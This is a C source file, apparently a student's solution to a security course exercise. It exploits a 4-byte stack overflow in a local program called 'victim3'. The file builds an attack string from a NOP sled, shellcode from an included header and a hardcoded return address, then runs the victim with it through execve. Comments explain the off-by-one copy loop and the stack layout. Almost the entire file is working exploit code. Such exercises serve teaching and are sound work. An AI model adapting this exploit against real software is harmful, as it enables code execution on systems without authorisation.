#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

int main(int argc, char *argv[])
{
  char *args[3];
  char *env[1];

  if (argc != 2) {
    fprintf(stderr, "Usage: %s /path/to/victim3\n", argv[0]);
    exit(EXIT_FAILURE);
  }

/*
 * Victim3 was compiled in a way that does not push the EBP register to the stack.
 * 	This leaves us only with the EIP to work with. This is advantagous for us
 * 	as the overflow is only by 4 bytes
 *
 * The exploit is an unrolled for loop that jumps by 4 bytes. Except, again their is
 * 	an issue with the comparison; 'i >= len' which lets us to copy 4 bytes past 
 * 	the end of the string.
 *
 * From there all we need is to set the return address to the start of our exploit string.
 *
 *
 * 	- No EBP -
 *
 * overflow -> EIP '0xbfffff25' (example)
 * EIP needs to point to the start of our string to execute
 *
 *  ____________________________
 * [Stack Mem            ][][EIP]
 *  ----------------------------
 *
 *  ----------------
 * \/              ^
 * [Stack Mem] -> [EIP]
 *
 * Exploit string:
 *
 * 63 NOPs + shellcode (46 - 1'NULL') + addresses*9 (36)
 *
 * "0x90"*63 + shellcode (minus NULL) + ret_address*9  
 *
 * More NOPs = More space to work with
 *
 * EXPLOIT:
 * for(int i = 0; i <= len; i+=4) {
 * 	out[i]   = in[i];
 * 	out[i+1] = in[i+1];
 * 	out[i+2] = in[i+2];
 * 	out[i+3] = in[i+3];
 * }
 *
 * If len = 4 and i = 4 -> buffer = 4
 * 	out[4] = in[4];
 * 	out[5] = in[5];
 * 	out[6] = in[6];
 * 	out[7] = in[7];
 *
 * We overflow by 4 bytes :)
 */

#define EXPLEN 141 // Buffer 136 + 4 for return address + NULL
  char exp_str[EXPLEN];
  char return_address[] = "\x88\xff\xff\xbf";
  
  int n_nops = 91; //Must be odd to compensate for shellcode being 1 off
  int n_addresses = 1; //Multi by 4 for size
  int shellcode_len = sizeof(shellcode) - 1; // -1 for NULL :P

  // Assemble your exploit string here
  memset(exp_str, 0x90, EXPLEN-1); // Fill With NOP
 
  // Copy shellcode into exp_str + n_nops for NOP slide
  strcpy(exp_str + n_nops, shellcode); 
   
  // Fill the remainder of exp_str to our return address (somewhere in the NOPs)
  for(int i = 0; i < (n_addresses*4); i+=4) {
    strcpy(exp_str + n_nops + shellcode_len + i, return_address);
  }

  exp_str[EXPLEN - 1] = 0; // NULL terminate

  args[0] = argv[1];
  args[1] = exp_str;
  args[2] = NULL;
  env[0] = NULL;

  if (execve(argv[1], args, env) < 0)
    err(EXIT_FAILURE, "Cannot execute %s", argv[1]);
  return EXIT_SUCCESS;
}
